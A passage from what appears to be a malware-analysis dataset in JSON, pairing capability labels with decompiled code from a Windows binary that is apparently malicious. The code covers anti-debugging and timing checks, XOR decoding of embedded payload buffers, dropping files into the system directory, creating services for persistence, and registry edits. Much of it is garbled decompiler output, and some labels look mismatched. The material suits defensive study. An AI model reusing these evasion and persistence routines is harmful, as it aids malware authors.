uStack32 & 0xffffff00;\n            uVar8 = uVar1 ^ uVar11;\n            (puVar2 + -1)[puVar13] = uVar8;\n            if ((-1 < uVar8) && (uStack32 = uVar11,  -1 >= uVar8)) {\n                *puVar2 = 0x32;\n                return uVar3 | uVar8;\n            }\n            unaff_EBX = uVar11 & 0xffffff00;\n            unaff_ESI = puVar13 + 2;\n            *(puVar13 + puVar2) = uVar1 ^ puVar12[-1];\n            in_stack_00000010 = *(puVar12 + 0x14);\n            *(puVar12 + -8) = puVar14 + 1;\n            *(puVar12 + -0xc) = unaff_ESI;\n        } while (puVar14 + 1 < in_stack_00000010);\n    }\n    return in_stack_00000010;\n}\n",
        "token_count": 1165
    },
    "00402ba0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402ba0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401180();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401850();\n        arg_ch_01 = fcn.00401850();\n        arg_ch_02 = fcn.00401850();\n        fcn.004011d0(arg_10h, arg_ch_00);\n        fcn.004011d0(arg_8h, arg_ch_01);\n        fcn.004011d0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4104c8, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401ef0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4104d4, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401ef0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4104d4, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401ef0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004011d0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 619
    },
    "00401090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401090(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.004033b0(hSCManager, arg_8h);\n    uVar1 = fcn.00401520(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "00401460": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401460(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401240(&var_68h, &var_4h);\n    fcn.00402d00(&var_68h, var_4h, 0x406014, 0xa4a0);\n    *param_1 = 0x406014;\n    *param_2 = 0xa4a0;\n    return;\n}\n",
        "token_count": 253
    },
    "00401520": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401520(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00401870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004018f5) overlaps instruction at (ram,0x004018f4)\n// \n// WARNING: Variable defined which should be unmapped: var_20fh\n\nuint __cdecl fcn.00401870(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t extraout_ECX;\n    uint8_t uVar5;\n    uint16_t extraout_DX;\n    uint8_t uVar7;\n    uint32_t uVar6;\n    ushort unaff_BX;\n    uint *puVar8;\n    bool bVar9;\n    bool bVar10;\n    bool bVar11;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    _lpBuffer = _lpBuffer & 0xffffff00;\n    puVar8 = &var_20fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    iVar3 = 0;\n    s = 0;\n    puVar8 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    while( true ) {\n        puVar1 = puVar8 + 2;\n        *puVar8 = iVar3;\n        puVar8 = puVar8 + 3;\n        *puVar1 = iVar3;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n        uVar2 = (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4104c8, &lpBuffer, arg_8h);\n        uVar2 = (extraout_DX & 0xff00 | (extraout_DX & 0x4e | 0x38) & uVar2) & uVar2 ^ 0x3c00;\n        uVar6 = (uVar2 & 0xff | (uVar2 >> 8) + (unaff_BX >> 8) << 8) | 0x604;\n        uVar5 = uVar6;\n        uVar7 = uVar6 >> 8;\n        bVar9 = CARRY1(uVar7, uVar5);\n        bVar11 = SCARRY1(uVar7, uVar5);\n        bVar10 = uVar7 + uVar5 == '\\0';\n        _lpBuffer = &var_8h;\n        iVar3 = fcn.00402fb0(&var_4h, _lpBuffer);\n        if ((bVar9 || bVar10) || (!bVar9 && !bVar10)) break;\n        if (!bVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar3 = iVar3 + 0x50a0 + bVar9;\n    }\n    fcn.004019c0(var_4h);\n    if ((!bVar10) && (bVar10)) {\n        var_8h = (extraout_ECX >> 8 & 0xffff00) << 8 | extraout_ECX & 0xffff;\n    }\n    iVar4 = fcn.00402d80(&s, 0x4104e8, var_4h, var_8h);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    fcn.004037d0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 890
    },
    "00401da0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401da0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401000(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00402960": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00402960(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4105a8);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x41f9dc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4105b8);\n    *0x41f9e0 = (*pcVar1)(iVar2, 0x4105d4);\n    *0x41f9e4 = (*pcVar1)(iVar2, 0x4105e4);\n    if (((*0x41f9dc != 0) && (*0x41f9e0 != 0)) && (*0x41f9e4 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 218
    },
    "00402d00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d00(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00402d80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402dd6) overlaps instruction at (ram,0x00402dd4)\n// \n\nuint __cdecl fcn.00402d80(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t iStack12;\n    \n    iStack12 = mode;\n    uStack16 = filename;\n    uStack20 = 0x402d92;\n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar1 != 0) {\n        uStack16 = nitems;\n        uStack20 = 1;\n        uStack24 = ptr;\n        iStack12 = iVar1;\n        (*_sym.imp.MSVCRT.dll_fwrite)();\n        *(unaff_EDI + 0x56) = *(unaff_EDI + 0x56) - &stack0xffffffe8;\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "00403030": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031c1) overlaps instruction at (ram,0x004031c0)\n// \n// WARNING: Removing unreachable block (ram,0x0040309a)\n\nuint * __cdecl fcn.00403030(uint8_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t in_EAX;\n    uint32_t uVar5;\n    char cVar8;\n    uint *puVar7;\n    int32_t in_ECX;\n    uint32_t in_EDX;\n    int32_t unaff_EBX;\n    uchar *puVar9;\n    uchar *unaff_ESI;\n    uchar *puVar10;\n    uint8_t *unaff_EDI;\n    char *pcVar11;\n    uint16_t in_ES;\n    char in_CF;\n    uchar in_PF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    bool bVar12;\n    char in_SF;\n    bool bVar13;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    int32_t iVar6;\n    \n    if ((!in_OF) && (in_OF)) {\n        LOCK();\n        unaff_ESI = 0x138b2633;\n        in_CF = 0x9a70ae80 < in_EAX;\n        in_OF = SCARRY4(in_EAX, 0x658f517f);\n        in_EAX = in_EAX + 0x658f517f;\n        in_SF = in_EAX < 0;\n        in_ZF = in_EAX == 0;\n        in_PF = (POPCOUNT(in_EAX & 0xff) & 1U) == 0;\n    }\n    *arg_8h = 0xc;\n    if ((in_PF) || (!in_PF)) {\n        arg_8h[1] = 0x98;\n        puVar9 = &stack0xfffffffc;\n        if ((in_OF != in_SF) || (puVar9 = &stack0xfffffffc,  in_OF == in_SF)) goto code_r0x00403095;\n        in_EDX = in_EDX & 0xffffff00 | (in_EDX - unaff_EBX) - in_CF;\n    }\n    puVar9 = *0xc617b43a;\n    *(in_EDX + 0xbf57197d) = *(in_EDX + 0xbf57197d) + unaff_EBX;\n    uVar5 = (in_EDX + 1 & 0xffff0000 | CONCAT11(0x13, in_EDX + 1)) + 0x18107d5f;\n    unaff_EDI = unaff_EDI & 0xffff0000 | in_ES;\n    unaff_ESI = 0x34a96cf3;\n    pcVar11 = arg_8h + 1 | puVar9;\n    arg_8h = pcVar11 + 1;\n    *pcVar11 = uVar5;\n    in_OF = '\\0';\n    in_EDX = in_EAX & 0xffffff00;\n    uVar4 = uVar5 + (uVar5 >> 8) * 'y';\n    in_EAX = uVar5 & 0xffff0000 | uVar4;\n    in_SF = '\\0';\n    in_ZF = uVar4 == 0;\ncode_r0x00403095:\n    arg_8h[2] = 0xbe;\n    uVar3 = in_EAX;\n    cVar8 = in_EAX >> 8;\n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        uVar2 = 9 < (uVar3 & 0xf) | in_AF;\n        if (in_ECX == 0) {\n            return in_EAX & 0xffff0000 | CONCAT11(cVar8 + uVar2, uVar3 + uVar2 * '\\x06') & 0xff0f;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[3] = 0x5f;\n    arg_8h[4] = 0xee;\n    arg_8h[5] = 0xdc;\n    arg_8h[6] = 0x73;\n    arg_8h[7] = 0xf7;\n    arg_8h[8] = 0x3d;\n    bVar12 = (CONCAT11((cVar8 - unaff_EBX) + 'M', uVar3) & 0x26ae) == 1;\n    arg_8h[9] = 0xe9;\n    if ((!bVar12) && (bVar12)) {\n        in_EAX = in_EAX & 0xe2f4cc58;\n        bVar12 = in_EAX == 0;\n    }\n    arg_8h[10] = 0x9b;\n    if ((!bVar12) && (bVar12)) {\n        bVar12 = (in_EAX & 0xe2f4cc58) == 0;\n    }\n    arg_8h[0xb] = 0xd3;\n    puVar10 = unaff_ESI;\n    if ((!bVar12) && (bVar12)) {\n        puVar10 = unaff_ESI + 1;\n        out(*unaff_ESI, in_EDX);\n    }\n    arg_8h[0xc] = 0xf6;\n    bVar12 = in_ECX < in_EDX;\n    bVar13 = -1 < in_ECX - 1;\n    iVar6 = *(puVar9 + 8);\n    *(iVar6 + 0xd) = 0x19;\n    if ((bVar13) && (!bVar13)) {\n        puVar1 = arg_8h + 4;\n        *(arg_8h + 0x1c) = in_ST0;\n        arg_8h = arg_8h + 5;\n        bVar12 = puVar10[4] < *puVar1;\n    }\n    *(iVar6 + 0xe) = 0x3a;\n    if ((bVar12) || (!bVar12)) {\n        iVar6 = *(puVar9 + 0xc);\n        arg_8h = unaff_EDI;\n    }\n    uVar3 = iVar6;\n    cVar8 = uVar3 - *arg_8h;\n    puVar7 = func_0x10189133((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *arg_8h) * 0x800 | (in_IF & 1) * 0x200 |\n                             (in_TF & 1) * 0x100 | (cVar8 < '\\0') * 0x80 | (cVar8 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                             ((POPCOUNT(cVar8) & 1U) == 0) * 4 | uVar3 < *arg_8h | (in_ID & 1) * 0x200000 |\n                             (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    *puVar7 = 0xf;\n    return puVar7;\n}\n",
        "token_count": 1719
    },
    "004031e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403233)\n// WARNING: Removing unreachable block (ram,0x0040323b)\n// WARNING: Removing unreachable block (ram,0x0040323e)\n// WARNING: Removing unreachable block (ram,0x004031bf)\n\nbool __cdecl fcn.004031e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 248
    },
    "00403940": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403940(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00401c40(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00401c40(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 163
    },
    "00401180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040118f) overlaps instruction at (ram,0x0040118b)\n// \n\nvoid fcn.00401180(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if (((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) || (in_EAX = *0x41f9d4,  *0x41f9d4 == 0)) {\n        *(unaff_EBP + 0x573375c0) = *(unaff_EBP + 0x573375c0) + in_EAX;\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41f9d4 = 1;\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "004011d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011fe) overlaps instruction at (ram,0x004011fd)\n// \n\nint32_t __cdecl fcn.004011d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    bool in_CF;\n    \n    if ((!in_CF) && (in_CF)) {\n        in_EAX = in_EAX + 0x7c8ecb0d + (in_CF == false);\n        puVar1 = unaff_ESI + 0x43d1773a;\n        *puVar1 = *puVar1 ^ 0x8b27e95e;\n        arg_ch = unaff_EDI;\n        if (-1 < *puVar1) {\n            return in_EAX;\n        }\n    }\n    uVar3 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar3 + arg_8h) = iVar2 % 0x1a + 'a';\n            uVar3 = uVar3 + 1;\n            in_EAX = arg_8h;\n        } while (uVar3 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 322
    },
    "00401850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401850(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "004023e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402426) overlaps instruction at (ram,0x00402424)\n// \n\nbool fcn.004023e0(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    pcVar2 = fcn.00402310();\n    if (pcVar2 == NULL) {\n        return false;\n    }\n    if ((pcVar2 < 0) || (pcVar2 >= 0)) {\n        pcVar2 = var_4h;\n    }\n    if (pcVar2 == 0x3ba74d1) {\n        return false;\n    }\n    uVar4 = 0xffffffff;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *var_4h;\n        var_4h = var_4h + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4106a8, 0x4106e8, 1, 0, ~uVar4 - 1);\n    return iVar3 == 0;\n}\n",
        "token_count": 302
    },
    "00402630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00402630(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00401180();\n    puStack296 = 0x40267a;\n    fcn.004011d0(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x402694;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x4026a7;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x41f9d8;\n    uStack312 = 0x41080c;\n    uStack316 = 0x80000000;\n    uStack320 = 0x4026c7;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x410840;\n    uStack328 = 1;\n    uStack332 = 0x41f9d8;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x41088c, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x4108c8, 1, 0x4108d0, 0x14);\n    return;\n}\n",
        "token_count": 657
    },
    "00402720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402779) overlaps instruction at (ram,0x00402778)\n// \n\nulong __cdecl fcn.00402720(uint8_t *arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint *puVar4;\n    uint8_t *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint8_t *puVar8;\n    uint *puVar9;\n    bool bVar10;\n    \n    puVar3 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == NULL) {\n        return CONCAT44(arg_ch, arg_8h);\n    }\n    puVar2 = arg_8h;\n    puVar4 = arg_14h;\n    puVar7 = arg_10h;\n    if (arg_8h <= puVar3) {\n        do {\n            if ((SBORROW4(arg_8h, puVar3)) || (!SBORROW4(arg_8h, puVar3))) {\n                puVar2 = *arg_8h;\n            }\n            puVar1 = arg_8h + 1;\n            *puVar7 = *puVar4;\n            arg_ch = 0x178a088a;\n            puVar6 = puVar4 + 1;\n            puVar9 = puVar7 + 1;\n            if (puVar2 == -0x76) {\n                puVar2 = puVar4 + 3;\n                arg_ch = 0;\n                bVar10 = true;\n                puVar5 = arg_8h + 2;\n                puVar8 = puVar7 + 5;\n                do {\n                    if (puVar2 == NULL) break;\n                    puVar2 = puVar2 + -1;\n                    bVar10 = *puVar5 == *puVar8;\n                    puVar5 = puVar5 + 1;\n                    puVar8 = puVar8 + 1;\n                } while (bVar10);\n                puVar6 = arg_14h;\n                puVar9 = arg_10h;\n                if (bVar10) goto code_r0x0040279b;\n            }\n            arg_8h = arg_8h + 2;\n            puVar4 = puVar6;\n            puVar7 = puVar9;\n        } while (arg_8h <= puVar3);\n    }\n    puVar1 = NULL;\ncode_r0x0040279b:\n    return CONCAT44(arg_ch, puVar1);\n}\n",
        "token_count": 594
    },
    "00402b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402b50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402170(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00402fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ffb) overlaps instruction at (ram,0x00402ff6)\n// \n\nvoid __cdecl fcn.00402fb0(uint *arg_8h, uint *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t extraout_CL;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char cVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    bool bVar5;\n    char cVar6;\n    char cVar7;\n    ulong uVar8;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar4 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    cVar7 = '\\0';\n    cVar3 = unaff_EBX >> 8;\n    cVar6 = cVar3 < '\\0';\n    bVar5 = cVar3 == '\\0';\n    uVar8 = fcn.00403030(&var_68h);\n    arg_ch_00 = var_4h;\n    if ((!bVar5 && cVar7 == cVar6) && (bVar5 || cVar7 != cVar6)) {\n        puVar1 = uVar8 + -0x74c625aa;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        arg_ch_00 = uVar8 >> 0x20;\n    }\n    fcn.00402d00(&var_68h, arg_ch_00, 0x4109c0, 0xf000);\n    *arg_8h = 0x4109c0;\n    *arg_ch = 0xf000;\n    return;\n}\n",
        "token_count": 464
    },
    "004033b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033f0) overlaps instruction at (ram,0x004033e7)\n// \n\nuint __cdecl fcn.004033b0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x43d1773a) = *(iVar1 + 0x43d1773a) ^ 0x5627e95e;\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 193
    },
    "00402e30": {
        "rules": [
            "hide graphical window"
        ],
